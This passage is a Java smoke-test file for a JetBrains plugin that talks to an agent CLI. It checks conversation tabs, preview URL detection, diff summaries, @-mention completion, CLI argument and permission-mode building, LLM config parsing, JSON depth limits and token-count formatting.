package com.chainlesschain.ide;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * Headless smoke for the pure logic layers ported from the VS Code extension:
 * ConversationManager (tabs + approval mode), PreviewDetect (App Preview),
 * MultiDiff (batch diff), Mentions (@-completion), SessionArgs (--permission-mode
 * selector), IntrospectArgs (cost/context args + context-window parser). No
 * IntelliJ SDK, no cc, no LLM — just plain {@code javac} + {@code java}.
 *
 * Repro (from packages/jetbrains-plugin):
 *   javac --release 17 -encoding UTF-8 -d .smoke-out \
 *     src/main/java/com/chainlesschain/ide/*.java \
 *     src/test/java/com/chainlesschain/ide/PureLogicSmokeMain.java
 *   java -cp .smoke-out com.chainlesschain.ide.PureLogicSmokeMain
 */
public final class PureLogicSmokeMain {

    private static int passed = 0;
    private static int failed = 0;

    private static void check(boolean cond, String name) {
        if (cond) { passed++; }
        else { failed++; System.out.println("  FAIL: " + name); }
    }

    private static void eq(Object got, Object want, String name) {
        boolean ok = (got == null) ? (want == null) : got.equals(want);
        if (!ok) System.out.println("  FAIL: " + name + " -> got[" + got + "] want[" + want + "]");
        if (ok) passed++; else failed++;
    }

    public static void main(String[] args) {
        conversationManager();
        previewDetect();
        multiDiff();
        mentions();
        sessionArgs();
        introspectArgs();
        llmConfig();
        slashCommands();
        cliVersionCheck();
        binaryResolution();
        miniJsonDepth();
        tokenTally();
        cliLauncher();
        fixWithCc();
        markdownLite();
        transcriptCap();
        lockfilePrune();
        jetbrainsMcpProbe();
        statusBarText();
        diffHunks();
        reviewNote();
        rewindCommands();
        sessionList();
        usageReport();
        imageAttachments();
        projectMemory();
        whatsNew();
        ideDoctor();
        ideContextV2();
        teamMonitor();
        backgroundAgents();
        activityLog();
        deepLink();
        autoExecGuard();
        remoteDoctor();
        semanticTools();
        sessionsWorkbench();
        artifacts();
        policyViewer();
        pluginQuality();
        remoteDoctorFixes();
        managedCli();
        bundleParity();

        System.out.println("\n=== PureLogicSmokeMain: " + passed + " passed, " + failed + " failed ===");
        if (failed > 0) System.exit(1);
    }

    private static void conversationManager() {
        System.out.println("ConversationManager:");
        ConversationManager m = new ConversationManager();
        ConversationManager.Conversation a = m.create();
        eq(a.id, "conv-1", "first id");
        eq(a.title, "Chat 1", "first title");
        eq(m.activeId(), "conv-1", "first active");

        ConversationManager.Conversation b = m.create("Bugfix", null, true);
        eq(b.title, "Bugfix", "custom title");
        eq(m.activeId(), "conv-2", "create activates");

        ConversationManager.Conversation c = m.create(null, null, false);
        eq(c.id, "conv-3", "third id");
        eq(m.activeId(), "conv-2", "activate=false keeps active");
        eq(m.count(), 3, "count 3");

        // list order + flags
        List<ConversationManager.TabInfo> tabs = m.list();
        eq(tabs.size(), 3, "list size");
        eq(tabs.get(1).active, Boolean.TRUE, "conv-2 active in list");
        m.setSession(c.id, new Object());
        eq(m.list().get(2).hasSession, Boolean.TRUE, "hasSession reflects set");

        // switchTo unknown
        eq(m.switchTo("nope"), null, "switchTo unknown -> null");
        eq(m.activeId(), "conv-2", "active unchanged after bad switch");

        // close active middle -> right neighbor
        m.switchTo(b.id);
        ConversationManager.CloseResult r = m.close(b.id);
        check(r.closed, "close returns closed");
        eq(m.activeId(), c.id, "close active -> right neighbor");

        // close active last -> left neighbor
        m.switchTo(c.id);
        m.close(c.id);
        eq(m.activeId(), a.id, "close last active -> left neighbor");

        // close final -> null active
        ConversationManager.CloseResult last = m.close(a.id);
        check(last.closed, "final close ok");
        eq(m.activeId(), null, "no active after final close");
        eq(m.count(), 0, "count 0");

        // ids keep increasing (no reuse)
        ConversationManager.Conversation d = m.create();
        eq(d.id, "conv-4", "ids not reused after closes");
        eq(d.title, "Chat 4", "title follows seq");

        // setters + allSessions order
        ConversationManager m2 = new ConversationManager();
        ConversationManager.Conversation x = m2.create();
        ConversationManager.Conversation y = m2.create();
        ConversationManager.Conversation z = m2.create();
        eq(m2.setSessionId(x.id, "sess").sessionId, "sess", "setSessionId");
        eq(m2.setSessionId(x.id, "").sessionId, null, "empty sessionId -> null");
        Object hx = new Object(); Object hz = new Object();
        m2.setSession(x.id, hx); m2.setSession(z.id, hz);
        eq(m2.allSessions(), Arrays.asList(hx, hz), "allSessions only live, in order");
        eq(m2.setTitle(x.id, "Renamed").title, "Renamed", "setTitle");
        eq(m2.setTitle(x.id, "").title, "Renamed", "empty title ignored");

        // approval mode (default + setMode, mirrors VS Code per-conversation mode)
        eq(x.mode, "default", "conversation mode defaults to 'default'");
        eq(m2.setMode(x.id, "acceptEdits").mode, "acceptEdits", "setMode");
        eq(m2.setMode(x.id, "").mode, "default", "empty mode -> default");

        // extended thinking (default + setThinking)
        eq(x.thinking, "off", "conversation thinking defaults to 'off'");
        eq(m2.setThinking(x.id, "ultra").thinking, "ultra", "setThinking");
        eq(m2.setThinking(x.id, "").thinking, "off", "empty thinking -> off");
    }

    private static void previewDetect() {
        System.out.println("PreviewDetect:");
        Map<String, String> s1 = new LinkedHashMap<String, String>();
        s1.put("build", "vite build"); s1.put("dev", "vite"); s1.put("start", "node .");
        PreviewDetect.DevScript d1 = PreviewDetect.pickDevScript(s1);
        eq(d1.script, "dev", "priority picks dev");
        eq(d1.command, "vite", "dev command");

        Map<String, String> s2 = new LinkedHashMap<String, String>();
        s2.put("ui:watch", "vite --host"); s2.put("build", "tsc");
        PreviewDetect.DevScript d2 = PreviewDetect.pickDevScript(s2);
        eq(d2.script, "ui:watch", "fallback to recognized tool");

        Map<String, String> s3 = new LinkedHashMap<String, String>();
        s3.put("build", "vite build"); s3.put("test", "vitest");
        check(PreviewDetect.pickDevScript(s3) == null, "no dev script -> null");
        check(PreviewDetect.pickDevScript(new LinkedHashMap<String, String>()) == null, "empty -> null");
        check(PreviewDetect.pickDevScript(null) == null, "null -> null");

        eq(PreviewDetect.detectServerUrl("  Local:   http://localhost:5173/"),
                "http://localhost:5173/", "vite banner");
        eq(PreviewDetect.detectServerUrl("ready - started server on http://localhost:3000"),
                "http://localhost:3000", "next banner");
        eq(PreviewDetect.detectServerUrl("[32m  ➜  Local:[39m [36mhttp://localhost:4321/[39m"),
                "http://localhost:4321/", "ANSI stripped");
        eq(PreviewDetect.detectServerUrl("see (http://localhost:3000)."),
                "http://localhost:3000", "trailing punctuation trimmed");
        eq(PreviewDetect.detectServerUrl("Network: http://0.0.0.0:5000/"),
                "http://localhost:5000/", "0.0.0.0 -> localhost");
        check(PreviewDetect.detectServerUrl("building for production...") == null, "no url -> null");
        check(PreviewDetect.detectServerUrl("see https://example.com/docs") == null, "non-local -> null");
        check(PreviewDetect.detectServerUrl(null) == null, "null line -> null");

        String out = "VITE v5.0  ready\n\n  ➜  Local:   http://localhost:5173/\n  ➜  Network: http://192.168.1.10:5173/";
        eq(PreviewDetect.detectServerUrlInText(out), "http://localhost:5173/", "first url in text");
        check(PreviewDetect.detectServerUrlInText("compiling...\nstill...") == null, "no url in text");
    }

    private static void multiDiff() {
        System.out.println("MultiDiff:");
        // normalize: dedupe last-wins + drop invalid
        List<MultiDiff.FileChange> raw = new ArrayList<MultiDiff.FileChange>();
        raw.add(new MultiDiff.FileChange("a.js", "1", null));
        raw.add(new MultiDiff.FileChange("a.js", "2", null)); // supersedes
        raw.add(new MultiDiff.FileChange("b.js", null, null)); // no modified -> dropped
        raw.add(new MultiDiff.FileChange("c.js", "z", "y"));
        List<MultiDiff.FileChange> norm = MultiDiff.normalizeMultiDiffFiles(raw);
        eq(norm.size(), 2, "normalize size");
        eq(norm.get(0).path, "a.js", "normalize keeps order");
        eq(norm.get(0).modifiedText, "2", "last write wins");

        // changeset summary +/- with new-file flag
        List<MultiDiff.FileChange> cs = new ArrayList<MultiDiff.FileChange>();
        cs.add(new MultiDiff.FileChange("edit.js", "a\nX\nc", "a\nb\nc")); // +1 -1
        cs.add(new MultiDiff.FileChange("new.js", "hello\nworld", "")); // +2 new
        MultiDiff.Summary sum = MultiDiff.changesetSummary(cs);
        eq(sum.count, 2, "summary count");
        eq(sum.totalAdded, 3, "total added");
        eq(sum.totalRemoved, 1, "total removed");
        MultiDiff.FileStat fresh = sum.files.get(1);
        check(fresh.isNew && fresh.added == 2 && fresh.removed == 0, "new file stat");

        // unchanged flag
        MultiDiff.Summary same = MultiDiff.changesetSummary(
                Arrays.asList(new MultiDiff.FileChange("same.js", "x\ny", "x\ny")));
        check(same.files.get(0).unchanged, "unchanged flagged");

        // fileLabel
        eq(MultiDiff.fileLabel(new MultiDiff.FileStat("a.js", 12, 3, false, false)),
                "a.js  +12 -3", "label counts");
        eq(MultiDiff.fileLabel(new MultiDiff.FileStat("n.js", 5, 0, true, false)),
                "n.js  +5 (new)", "label new");

        // selectWrites: null = all changed (drop no-op), subset, empty
        List<MultiDiff.FileChange> files = Arrays.asList(
                new MultiDiff.FileChange("a.js", "2", "1"),
                new MultiDiff.FileChange("b.js", "y", "x"),
                new MultiDiff.FileChange("noop.js", "same", "same"));
        List<MultiDiff.FileChange> all = MultiDiff.selectWrites(files, null);
        eq(all.size(), 2, "selectWrites null -> all changed");
        Set<String> pick = new HashSet<String>(Arrays.asList("a.js", "noop.js"));
        List<MultiDiff.FileChange> sub = MultiDiff.selectWrites(files, pick);
        eq(sub.size(), 1, "selectWrites subset drops no-op");
        eq(sub.get(0).path, "a.js", "selectWrites subset content");
        eq(MultiDiff.selectWrites(files, new HashSet<String>()).size(), 0, "empty selection writes nothing");
    }

    private static void mentions() {
        System.out.println("Mentions:");
        // detectAtToken: at start / after space / bracket; glued @ is NOT a mention.
        Mentions.AtToken t = Mentions.detectAtToken("see @src/ap");
        check(t != null && t.prefix.equals("src/ap") && t.start == 4, "detectAtToken after space");
        Mentions.AtToken t2 = Mentions.detectAtToken("@a");
        check(t2 != null && t2.prefix.equals("a") && t2.start == 0, "detectAtToken at start");
        check(Mentions.detectAtToken("user@host") == null, "glued @ is not a mention");
        check(Mentions.detectAtToken("done @x ") == null, "no token when not at caret");

        // filterFiles: basename-prefix first, then path-prefix, then substring; case-insensitive.
        List<String> files = Arrays.asList(
                "src/app.js", "src/chat/at-mention.js", "lib/app-helper.js", "README.md");
        List<String> hits = Mentions.filterFiles(files, "app", 20);
        eq(hits.get(0), "src/app.js", "basename-prefix ranks first");
        check(hits.contains("lib/app-helper.js"), "basename-prefix includes app-helper");
        check(!hits.contains("src/chat/at-mention.js"), "no 'app' substring -> excluded");
        // substring match works on a real case:
        check(Mentions.filterFiles(files, "mention", 20).contains("src/chat/at-mention.js"),
                "substring match");
        eq(Mentions.filterFiles(files, "", 2).size(), 2, "empty prefix -> first N");
        check(Mentions.filterFiles(files, "SRC/APP", 20).contains("src/app.js"),
                "case-insensitive path-prefix");

        // deriveFolders: unique, sorted ancestor dirs with a trailing slash.
        eq(Mentions.deriveFolders(Arrays.asList("a/b/c.js", "a/d.js", "top.md"), 50),
                Arrays.asList("a/", "a/b/"), "deriveFolders ancestors");
        eq(Mentions.deriveFolders(Arrays.asList("x\\y\\z.js"), 50),
                Arrays.asList("x/", "x/y/"), "deriveFolders normalizes backslashes");
        eq(Mentions.deriveFolders(Arrays.asList("README.md"), 50).size(), 0,
                "deriveFolders root-only -> none");
        eq(Mentions.deriveFolders(null, 50).size(), 0, "deriveFolders null -> none");
        eq(Mentions.deriveFolders(Arrays.asList("a/x.js", "b/x.js", "c/x.js"), 2).size(), 2,
                "deriveFolders caps at limit");
        // a trailing-slash folder ranks by its last segment, ahead of a path-only file hit.
        eq(Mentions.filterFiles(Arrays.asList("src/", "src/app.js"), "src", 10).get(0),
                "src/", "folder basename ranks first");

        // ideMentionMatches
        eq(Mentions.ideMentionMatches("").size(), 2, "empty -> both ide mentions");
        eq(Mentions.ideMentionMatches("s"), Arrays.asList("selection"), "@s -> selection");
        eq(Mentions.ideMentionMatches("d"), Arrays.asList("diagnostics"), "@d -> diagnostics");

        // applyMention: splice with trailing space
        Mentions.AtToken at = Mentions.detectAtToken("look @ap");
        Mentions.ApplyResult ap = Mentions.applyMention("look @ap", at, "src/app.js", 8);
        eq(ap.text, "look @src/app.js ", "applyMention text");
        eq(ap.caret, "look @src/app.js ".length(), "applyMention caret");

        // symbolKindLabel + formatSymbolItems + dedupe
        eq(Mentions.symbolKindLabel(11), "function", "kind 11 -> function");
        eq(Mentions.symbolKindLabel(4), "class", "kind 4 -> class");
        eq(Mentions.symbolKindLabel(999), "symbol", "unknown kind -> symbol");
        List<Mentions.Symbol> syms = Arrays.asList(
                new Mentions.Symbol("handleClick", 11, "C:\\ws\\src\\ui\\button.ts"),
                new Mentions.Symbol("", 4, "C:\\ws\\x.ts"),         // nameless -> skipped
                new Mentions.Symbol("Widget", 4, "C:\\ws\\src\\widget.ts"));
        List<Mentions.MentionItem> items = Mentions.formatSymbolItems(syms, "C:\\ws", 8);
        eq(items.size(), 2, "formatSymbolItems skips nameless");
        eq(items.get(0).label, "function handleClick · src/ui/button.ts", "symbol label + relpath");
        eq(items.get(0).value, "src/ui/button.ts", "symbol value = relpath");

        // dedupeMentionItems: keep first per value
        List<Mentions.MentionItem> mixed = Arrays.asList(
                Mentions.MentionItem.path("src/app.js"),
                Mentions.MentionItem.symbol("function foo · src/app.js", "src/app.js"), // dup value
                Mentions.MentionItem.symbol("class Bar · src/bar.js", "src/bar.js"));
        List<Mentions.MentionItem> deduped = Mentions.dedupeMentionItems(mixed);
        eq(deduped.size(), 2, "dedupe by inserted value");
        eq(deduped.get(0).value, "src/app.js", "dedupe keeps first");
        eq(Mentions.mentionLabel(deduped.get(1)), "class Bar · src/bar.js", "mentionLabel");
        eq(Mentions.mentionValue(deduped.get(1)), "src/bar.js", "mentionValue");

        // formatInsertReference (§5 @file#L line ranges) — 0-based in, 1-based inclusive out
        eq(Mentions.formatInsertReference("src/app.ts", 0, 0, 0, 0), "@src/app.ts",
                "no selection -> bare @path");
        eq(Mentions.formatInsertReference("src/app.ts", 6, 2, 6, 9), "@src/app.ts#L7",
                "single line -> #L7");
        eq(Mentions.formatInsertReference("src/app.ts", 4, 0, 9, 3), "@src/app.ts#L5-10",
                "multi-line range -> #L5-10");
        eq(Mentions.formatInsertReference("src/app.ts", 4, 0, 9, 0), "@src/app.ts#L5-9",
                "trailing col-0 line dropped -> #L5-9");
        eq(Mentions.formatInsertReference("a.txt", 2, 0, 3, 0), "@a.txt#L3",
                "whole single line via col-0 end -> #L3");
    }

    private static void sessionArgs() {
        System.out.println("SessionArgs:");
        // permission mode → --permission-mode for the hands-off modes only
        eq(SessionArgs.build(null, null, null, "acceptEdits"),
                Arrays.asList("--permission-mode", "acceptEdits"), "mode acceptEdits");
        eq(SessionArgs.build(null, null, null, "bypassPermissions"),
                Arrays.asList("--permission-mode", "bypassPermissions"), "mode bypassPermissions");
        eq(SessionArgs.build(null, null, null, "default"),
                new ArrayList<String>(), "mode default -> no flag");
        eq(SessionArgs.build(null, null, null, "nonsense"),
                new ArrayList<String>(), "unknown mode -> no flag");
        eq(SessionArgs.build(null, null, null, null),
                new ArrayList<String>(), "null mode -> no flag");
        // composed after provider/model/resume, blanks omitted
        eq(SessionArgs.build("ollama", "qwen2.5:7b", "sess-1", "acceptEdits"),
                Arrays.asList("--provider", "ollama", "--model", "qwen2.5:7b",
                        "--resume", "sess-1", "--permission-mode", "acceptEdits"),
                "composed args order");
        eq(SessionArgs.build("  ", "", null, "default"),
                new ArrayList<String>(), "all blank -> empty");
        check(SessionArgs.PERMISSION_MODES.contains("acceptEdits")
                && !SessionArgs.PERMISSION_MODES.contains("default"),
                "PERMISSION_MODES allow-list (no 'default')");
        // First-spawn declared id (anonymous stream sessions never persist):
        // panel- prefix, sane length, and two calls never collide.
        String sid1 = SessionArgs.newPanelSessionId();
        String sid2 = SessionArgs.newPanelSessionId();
        check(sid1.startsWith("panel-") && sid1.length() > 12,
                "newPanelSessionId shape");
        check(!sid1.equals(sid2), "newPanelSessionId unique per call");
        // extended thinking flag (on -> --think, ultra -> --ultrathink, else none)
        eq(SessionArgs.build(null, null, null, "default", "on"),
                Arrays.asList("--think"), "think on -> --think");
        eq(SessionArgs.build(null, null, null, "default", "ultra"),
                Arrays.asList("--ultrathink"), "think ultra -> --ultrathink");
        eq(SessionArgs.build(null, null, null, "default", "off"),
                new ArrayList<String>(), "think off -> no flag");
        eq(SessionArgs.build(null, null, null, "default", null),
                new ArrayList<String>(), "think null -> no flag");
        eq(SessionArgs.build("anthropic", null, "s1", "acceptEdits", "ultra"),
                Arrays.asList("--provider", "anthropic", "--resume", "s1",
                        "--permission-mode", "acceptEdits", "--ultrathink"),
                "mode + think composed");
        // FULL block (7-arg): --base-url + --api-key passed so a cloud provider's
        // endpoint/key isn't dropped (the "配置了火山却 fetch failed" root-cure).
        eq(SessionArgs.build("volcengine", "doubao-x",
                        "https://ark.cn-beijing.volces.com/api/v3", "sk-volc",
                        "sess-1", "default", null),
                Arrays.asList("--provider", "volcengine", "--model", "doubao-x",
                        "--base-url", "https://ark.cn-beijing.volces.com/api/v3",
                        "--api-key", "sk-volc", "--resume", "sess-1"),
                "full block: base-url + api-key in order");
        eq(SessionArgs.build("ollama", "m", "  ", "", "s1", "default", null),
                Arrays.asList("--provider", "ollama", "--model", "m",
                        "--resume", "s1"),
                "blank base-url/api-key omitted (back-compat)");
        eq(SessionArgs.build(null, null, null, "default"),
                new ArrayList<String>(), "4-arg overload still works");
    }

    private static void introspectArgs() {
        System.out.println("IntrospectArgs:");
        // --json only for context, never for cost
        eq(IntrospectArgs.build("context", "s1", null, null, true),
                Arrays.asList("context", "s1", "--json"), "context --json");
        eq(IntrospectArgs.build("context", "s1", "m", "p", true),
                Arrays.asList("context", "s1", "--model", "m", "--provider", "p", "--json"),
                "context with model/provider/json");
        eq(IntrospectArgs.build("cost", "s1", null, null, true),
                Arrays.asList("cost", "s1"), "cost ignores json");

        // parseContextStatus: derive total/window/pct/overflow from cc context --json
        IntrospectArgs.ContextStatus ok = IntrospectArgs.parseContextStatus(
                "{\"contextWindow\":200000,\"totalTokens\":12000}");
        check(ok != null && ok.total == 12000 && ok.window == 200000
                && ok.pct == 6 && !ok.overflow, "parse ok -> 6% no overflow");
        IntrospectArgs.ContextStatus over = IntrospectArgs.parseContextStatus(
                "{\"contextWindow\":1000,\"totalTokens\":1500}");
        check(over != null && over.pct == 150 && over.overflow, "overflow by ratio");
        IntrospectArgs.ContextStatus flag = IntrospectArgs.parseContextStatus(
                "{\"contextWindow\":1000,\"totalTokens\":10,\"overflows\":true}");
        check(flag != null && flag.overflow, "overflow by 'overflows' field");
        // null cases
        check(IntrospectArgs.parseContextStatus("not json") == null, "bad JSON -> null");
        check(IntrospectArgs.parseContextStatus("") == null, "empty -> null");
        check(IntrospectArgs.parseContextStatus("{\"totalTokens\":5}") == null,
                "missing window -> null");
        check(IntrospectArgs.parseContextStatus(
                "{\"contextWindow\":0,\"totalTokens\":5}") == null, "zero window -> null");
    }

    private static void llmConfig() {
        System.out.println("LlmConfig.parseLlmProviderModel:");
        // THE FIX: the panel pins provider/model from ~/.chainlesschain/config.json
        // so it can't drift to a stale ambient default (the anthropic-401 bug).
        String[] full = LlmConfig.parseLlmProviderModel(
                "{\"llm\":{\"provider\":\"volcengine\",\"model\":\"doubao-seed-1-6\"}}");
        eq(full[0], "volcengine", "provider parsed");
        eq(full[1], "doubao-seed-1-6", "model parsed");
        // provider only (no model) → model null, provider still pinned
        String[] provOnly = LlmConfig.parseLlmProviderModel("{\"llm\":{\"provider\":\"ollama\"}}");
        eq(provOnly[0], "ollama", "provider-only provider");
        eq(provOnly[1], null, "provider-only model null");
        // blanks → null (SessionArgs then omits the flag → CLI resolves)
        String[] blank = LlmConfig.parseLlmProviderModel("{\"llm\":{\"provider\":\"  \"}}");
        eq(blank[0], null, "blank provider -> null");
        // no llm block / bad json → {null,null}
        eq(LlmConfig.parseLlmProviderModel("{}")[0], null, "no llm -> null");
        eq(LlmConfig.parseLlmProviderModel("not json")[0], null, "bad json -> null");

        // looksLikeLlmConfigError: nudge to the wizard only on auth/key failures.
        check(LlmConfig.looksLikeLlmConfigError("Anthropic error: 401"), "401 -> config error");
        check(LlmConfig.looksLikeLlmConfigError("ANTHROPIC_API_KEY required"), "api key -> config error");
        check(LlmConfig.looksLikeLlmConfigError("403 Forbidden"), "403 -> config error");
        check(!LlmConfig.looksLikeLlmConfigError("network timeout"), "network -> not config error");
        check(!LlmConfig.looksLikeLlmConfigError(null), "null -> not config error");

        // suggestVisionModel: volcengine has a distinct vision model; others blank.
        eq(LlmConfig.suggestVisionModel("volcengine"), "doubao-seed-2-0-lite-260215", "volcengine vision");
        eq(LlmConfig.suggestVisionModel("ollama"), "", "ollama vision blank");

        // buildConfigSetArgs: visionModel adds one set; blank omits it.
        java.util.List<java.util.List<String>> withVis = LlmConfig.buildConfigSetArgs(
                "volcengine", "doubao-seed-1-6", "k", "https://x", "doubao-vision");
        boolean hasVision = false;
        for (java.util.List<String> s : withVis) {
            if (s.size() >= 4 && "llm.visionModel".equals(s.get(2)) && "doubao-vision".equals(s.get(3))) {
                hasVision = true;
            }
        }
        check(hasVision, "buildConfigSetArgs emits llm.visionModel");
        int noVis = LlmConfig.buildConfigSetArgs("ollama", "m", "", "u", "").size();
        int yesVis = LlmConfig.buildConfigSetArgs("ollama", "m", "", "u", "v").size();
        check(yesVis == noVis + 1, "blank visionModel omitted, set when present");
    }

    private static void slashCommands() {
        System.out.println("SlashCommands:");
        // detectSlashToken: only a bare leading slash token (whole input so far)
        eq(SlashCommands.detectSlashToken("/co"), "co", "/co -> co");
        eq(SlashCommands.detectSlashToken("/"), "", "/ -> empty (all)");
        eq(SlashCommands.detectSlashToken("  /TH"), "th", "lowercased + leading ws");
        check(SlashCommands.detectSlashToken("/cost x") == null, "full cmd + arg -> null");
        check(SlashCommands.detectSlashToken("hi /x") == null, "mid-line slash -> null");
        check(SlashCommands.detectSlashToken("") == null, "empty -> null");
        // filter: prefix-matches command name (sans '/'), in menu order
        List<String[]> co = SlashCommands.filter("co");
        check(co.size() == 3, "filter co -> /compact /context /cost (3)");
        eq(co.get(0)[0], "/compact", "co first = /compact (menu order)");
        List<String[]> comp = SlashCommands.filter("comp");
        check(comp.size() == 1 && comp.get(0)[0].equals("/compact"), "comp -> only /compact");
        eq(SlashCommands.filter("").size(), SlashCommands.COMMANDS.size(), "empty prefix -> all");
        check(SlashCommands.filter("zzz").isEmpty(), "no match -> empty");
        List<String[]> rev = SlashCommands.filter("rev");
        check(rev.size() == 1 && rev.get(0)[0].equals("/review"), "rev -> only /review");
        List<String[]> re = SlashCommands.filter("re");
        check(re.size() == 5 && re.get(0)[0].equals("/reject") && re.get(1)[0].equals("/review")
                && re.get(2)[0].equals("/retry") && re.get(3)[0].equals("/rewind")
                && re.get(4)[0].equals("/release-notes"),
                "re -> /reject /review /retry /rewind /release-notes (menu order)");
        List<String[]> ret = SlashCommands.filter("ret");
        check(ret.size() == 1 && ret.get(0)[0].equals("/retry"), "ret -> only /retry");
        List<String[]> sess = SlashCommands.filter("sess");
        check(sess.size() == 1 && sess.get(0)[0].equals("/sessions"), "sess -> only /sessions");
        // label
        eq(SlashCommands.label(new String[] { "/cost", "token cost" }),
                "/cost  —  token cost", "label format");
    }

    private static void binaryResolution() {
        System.out.println("AgentChatSession.looksLikeCcVersion (cc-conflict resolution):");
        check(AgentChatSession.looksLikeCcVersion("0.162.95"), "bare semver → chainlesschain");
        check(AgentChatSession.looksLikeCcVersion("0.162.95\n"), "trailing newline ok");
        check(AgentChatSession.looksLikeCcVersion("v1.2.3"), "v-prefixed ok");
        check(!AgentChatSession.looksLikeCcVersion("cc (GCC) 12.2.0"), "C compiler banner → reject");
        check(!AgentChatSession.looksLikeCcVersion("Apple clang version 15.0.0"), "clang → reject");
        check(!AgentChatSession.looksLikeCcVersion("Microsoft Windows [Version 10.0.19045]"), "win banner → reject");
        check(!AgentChatSession.looksLikeCcVersion(""), "empty → reject");
        check(!AgentChatSession.looksLikeCcVersion(null), "null → reject");
        check(!AgentChatSession.looksLikeCcVersion("not a version"), "junk → reject");

        // chooseBinary: pure candidate selection with an injected probe. A `cc`
        // shadowed by the C compiler must fall through to `chainlesschain`; all
        // candidates failing must yield null (resolveBinary then does NOT cache,
        // so installing the CLI mid-session recovers without an IDE restart).
        eq(AgentChatSession.chooseBinary(c -> "0.162.150"), "cc", "chooseBinary: healthy cc wins");
        eq(AgentChatSession.chooseBinary(
                        c -> c.equals("cc") ? "cc (GCC) 12.2.0"
                                : c.equals("chainlesschain") ? "0.162.150" : ""),
                "chainlesschain", "chooseBinary: shadowed cc → chainlesschain");
        eq(AgentChatSession.chooseBinary(c -> ""), null, "chooseBinary: all fail → null (uncached)");
        eq(AgentChatSession.chooseBinary(c -> null), null, "chooseBinary: null probe → null");
    }

    private static void miniJsonDepth() {
        System.out.println("MiniJson depth cap (SOE → catchable IAE):");
        // Well-formed nesting parses to the cap…
        StringBuilder ok = new StringBuilder();
        for (int i = 0; i < 512; i++) ok.append('[');
        for (int i = 0; i < 512; i++) ok.append(']');
        boolean parsed;
        try { MiniJson.parse(ok.toString()); parsed = true; }
        catch (RuntimeException e) { parsed = false; }
        check(parsed, "512-deep array parses");
        // …but one past the cap throws IllegalArgumentException, NOT StackOverflowError
        // (an Error would sail past parseEventLine's catch and kill the pump thread).
        StringBuilder deep = new StringBuilder();
        for (int i = 0; i < 513; i++) deep.append('[');
        for (int i = 0; i < 513; i++) deep.append(']');
        boolean threwIae = false;
        try { MiniJson.parse(deep.toString()); }
        catch (IllegalArgumentException e) { threwIae = true; }
        check(threwIae, "513-deep array → IllegalArgumentException");
        StringBuilder deepObj = new StringBuilder();
        for (int i = 0; i < 600; i++) deepObj.append("{\"a\":");
        deepObj.append("1");
        for (int i = 0; i < 600; i++) deepObj.append('}');
        boolean threwIaeObj = false;
        try { MiniJson.parse(deepObj.toString()); }
        catch (IllegalArgumentException e) { threwIaeObj = true; }
        check(threwIaeObj, "600-deep object → IllegalArgumentException");
        // Depth is nesting depth, not cumulative: wide-but-flat stays parseable.
        StringBuilder wide = new StringBuilder("[");
        for (int i = 0; i < 700; i++) wide.append(i > 0 ? ",{}" : "{}");
        wide.append("]");
        boolean wideOk;
        try { MiniJson.parse(wide.toString()); wideOk = true; }
        catch (RuntimeException e) { wideOk = false; }
        check(wideOk, "700 flat sibling objects parse (depth resets)");
        // NaN / Infinity have no JSON form — stringify emits null so ONE poisoned
        // numeric field can't make the whole JSON-RPC body unparseable.
        java.util.Map<String, Object> nan = MiniJson.obj();
        nan.put("v", Double.NaN);
        eq(MiniJson.stringify(nan), "{\"v\":null}", "NaN → null (valid JSON)");
        java.util.Map<String, Object> inf = MiniJson.obj();
        inf.put("v", Double.POSITIVE_INFINITY);
        eq(MiniJson.stringify(inf), "{\"v\":null}", "Infinity → null (valid JSON)");
        java.util.Map<String, Object> fin = MiniJson.obj();
        fin.put("i", 3.0);
        fin.put("f", 2.5);
        eq(MiniJson.stringify(fin), "{\"i\":3,\"f\":2.5}", "finite doubles still render");
    }

    private static void tokenTally() {
        System.out.println("TokenTally (live token counter + iteration warning, VS Code 0.37.2 parity):");
        // Compact formatting — the VS Code tokfmt twin.
        eq(ChatEvents.formatTokens(456), "456", "formatTokens <1k verbatim");
        eq(ChatEvents.formatTokens(2345), "2.3k", "formatTokens 1 decimal under 10k");
        eq(ChatEvents.formatTokens(12345), "12k", "formatTokens ≥10k drops the decimal");
        eq(ChatEvents.formatTokens(123456), "123k", "formatTokens large stays integer-k");
        eq(ChatEvents.formatTokens(1000), "1.0k", "formatTokens exactly 1k");
        // Accumulation across per-LLM-call usage payloads.
        ChatEvents.TokenTally t = new ChatEvents.TokenTally();
        java.util.Map<String, Object> u1 = new java.util.LinkedHashMap<>();
        u1.put("input_tokens", 12000L);
        u1.put("output_tokens", 300L);
        u1.put("cache_read_input_tokens", 900L);
        java.util.Map<String, Object> u2 = new java.util.LinkedHashMap<>();
        u2.put("input_tokens", 345L);
        u2.put("output_tokens", 156L);
        t.add(u1);
        t.add(u2);
        eq(t.statusLine(), "thinking… · 12k→456 tokens (900 cached)",
                "statusLine accumulates + shows cached");
        ChatEvents.TokenTally noCache = new ChatEvents.TokenTally();
        noCache.add(u2);
        eq(noCache.statusLine(), "thinking… · 345→156 tokens",
                "statusLine omits (0 cached)");
        t.add(null); // defensive: null payload is a no-op
        eq(t.statusLine(), "thinking… · 12k→456 tokens (900 cached)",
                "null usage payload ignored");
        // End-of-turn authoritative line from the result envelope.
        eq(ChatEvents.readyLine(u1), "ready · 12k→300 tokens", "readyLine from usage");
        eq(ChatEvents.readyLine(null), "ready", "readyLine without usage");
        // Event mapping: token_usage → kind usage; iteration_warning → ⚠ info.
        ChatEvents.TurnState st = new ChatEvents.TurnState();
        java.util.Map<String, Object> evU = new java.util.LinkedHashMap<>();
        evU.put("type", "token_usage");
        evU.put("usage", u1);
        java.util.Map<String, Object> mapped = ChatEvents.mapAgentEvent(evU, st);
        check(mapped != null && "usage".equals(mapped.get("kind"))
                && mapped.get("usage") == u1, "token_usage → {kind:usage, usage}");
        java.util.Map<String, Object> evUBad = new java.util.LinkedHashMap<>();
        evUBad.put("type", "token_usage"); // no usage map → stays UI-silent
        check(ChatEvents.mapAgentEvent(evUBad, st) == null, "token_usage without usage → null");
        java.util.Map<String, Object> evW = new java.util.LinkedHashMap<>();
        evW.put("type", "iteration_warning");
        evW.put("message", "iteration 20/25");
        java.util.Map<String, Object> warn = ChatEvents.mapAgentEvent(evW, st);
        check(warn != null && "info".equals(warn.get("kind"))
                && "⚠ iteration 20/25".equals(warn.get("text")),
                "iteration_warning → ⚠ info line");
        java.util.Map<String, Object> evW2 = new java.util.LinkedHashMap<>();
